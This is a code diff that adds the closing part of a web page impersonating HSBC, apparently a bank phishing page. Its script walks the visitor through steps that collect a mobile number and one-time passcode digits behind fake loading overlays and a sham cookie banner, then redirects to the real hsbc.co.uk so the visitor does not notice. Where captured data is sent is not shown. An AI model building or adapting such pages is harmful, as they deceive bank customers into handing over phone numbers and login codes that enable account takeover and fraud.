+    ov.style.display = 'flex';
+    /* double rAF forces repaint so transition fires */
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){ ov.style.opacity = '1'; }); });
+    setTimeout(function() {
+      go(n);
+      setTimeout(function() {
+        ov.style.opacity = '0';
+        setTimeout(function() { ov.style.display = 'none'; }, 260);
+        /* restore button only on non-final steps */
+        if (!isFinal) {
+          btn.innerHTML = origHtml;
+          btn.disabled  = false;
+          btn.style.opacity = '1';
+        }
+      }, isFinal ? 400 : 200);
+    }, isFinal ? 1500 : 680);
+  }
+
+
+  function go(n) {
+    if (n === 3) {
+      var raw = document.getElementById('hsbc-mobile').value.replace(/\s/g, '');
+      var hint = raw.length >= 2 ? '●●●●' + raw.slice(-2) : (raw || '●●●●??');
+      document.getElementById('hsbc-mobile-hint').textContent = hint;
+    }
+    document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
+    ['sb1','sb2','sb3','sb4'].forEach(function(id,i){
+      var el = document.getElementById(id);
+      el.classList.remove('active','done');
+      if(i+1 < n) el.classList.add('done');
+      else if(i+1 === n) el.classList.add('active');
+    });
+    document.getElementById('step'+n).classList.add('active');
+    if(n===4) redirect();
+  }
+
+  function redirect(){
+    var s=5, fill=document.getElementById('pfill'), txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){ fill.style.width='100%'; },50);
+    var iv=setInterval(function(){
+      s--;
+      if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://www.hsbc.co.uk';},400);}
+      else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');
+    },1000);
+  }
+
+  var hsbcOtp = document.querySelectorAll('.hsbc-otp');
+  hsbcOtp.forEach(function(inp,i){
+    inp.addEventListener('input',function(){
+      this.value=this.value.replace(/[^0-9]/g,'');
+      if(this.value&&i<hsbcOtp.length-1) hsbcOtp[i+1].focus();
+    });
+    inp.addEventListener('keydown',function(e){
+      if(e.key==='Backspace'&&!this.value&&i>0) hsbcOtp[i-1].focus();
+    });
+  });
+</script>
+
+  <!-- Loading Overlay -->
+  <div id="ld-ov" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.96);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;opacity:0;transition:opacity .25s;">
+    <div style="position:relative;width:56px;height:56px;">
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid #e8e8e8;"></div>
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid transparent;border-top-color:#DB0011;animation:ld-spin .8s linear infinite;"></div>
+    </div>
+    <div id="ld-msg" style="font-size:14px;color:#555;font-weight:600;letter-spacing:.2px;"></div>
+  </div>
+
+  <!-- Cookie Banner -->
+  <div id="ck-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:9999;">
+    <style>
+      @keyframes ckUp{from{transform:translateY(110%);opacity:0}to{transform:translateY(0);opacity:1}}
+      @keyframes ckDown{from{transform:translateY(0);opacity:1}to{transform:translateY(110%);opacity:0}}
+      #ck-bar{animation:ckUp .5s cubic-bezier(.22,1,.36,1) forwards;}
+    </style>
+    <div style="height:4px;background:#DB0011;"></div>
+    <div style="background:#111;padding:18px 28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 -6px 28px rgba(0,0,0,.5);">
+      <div style="width:48px;height:48px;background:#DB0011;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.3);">&#127850;</div>
+      <div style="flex:1;min-width:200px;">
+        <div style="font-size:14px;font-weight:800;color:#fff;margin-bottom:5px;">HSBC uses cookies</div>
+        <p style="font-size:12px;color:#aaa;margin:0;line-height:1.6;">We use cookies and similar technologies to enhance your experience, remember your preferences and help us understand how our site is used. <a href="#" style="color:#f08080;text-decoration:underline;font-weight:600;">Read our cookie policy</a></p>
+      </div>
+      <div style="display:flex;gap:10px;flex-shrink:0;">
+        <button onclick="manageCk()" onmouseover="this.style.borderColor='#aaa';this.style.color='#fff'" onmouseout="this.style.borderColor='#555';this.style.color='#ccc'" style="padding:10px 18px;background:transparent;color:#ccc;border:1.5px solid #555;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;">Manage preferences</button>
+        <button onclick="acceptCk()" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'" style="padding:10px 24px;background:#DB0011;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:800;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.25);">Accept all cookies</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function(){if(localStorage.getItem('ck-ok'))document.getElementById('ck-bar').style.display='none';})();
+    function acceptCk(){localStorage.setItem('ck-ok','1');var b=document.getElementById('ck-bar');b.style.animation='ckDown .35s ease forwards';setTimeout(function(){b.style.display='none';},320);}
+    function manageCk(){acceptCk();}
+  </script>
+</body>
+</html>
